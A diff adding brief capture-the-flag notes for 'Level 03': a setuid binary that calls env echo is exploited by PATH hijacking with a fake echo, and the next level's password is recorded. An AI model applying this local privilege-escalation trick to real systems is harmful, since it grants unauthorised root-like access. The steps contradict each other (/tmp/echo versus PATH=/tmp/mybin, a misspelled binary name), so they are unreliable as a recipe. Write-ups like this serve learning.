@@ -1,0 +1,14 @@
+Level 03:
+
+- Ran: ls -l
+- Output: -rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03
+- Ran: file level03
+- Output: level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, Build  ID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
+- Ran: ./level03
+- Output: Exploit me
+- Analyzed: Used Ghidra to decompile level03
+- Findings: Binary calls system("/usr/bin/env echo Exploit me"), vulnerable to path manipulation
+- Exploit: Created a exploit echo on /tmp/echo unvoking the call from it
+- Exploit: Changing The Path Var to "PATH=/tmp/mybin"
+- Ran: ./levl03
+- Output: qi0maab88jeaj46qoumi7maus > level04
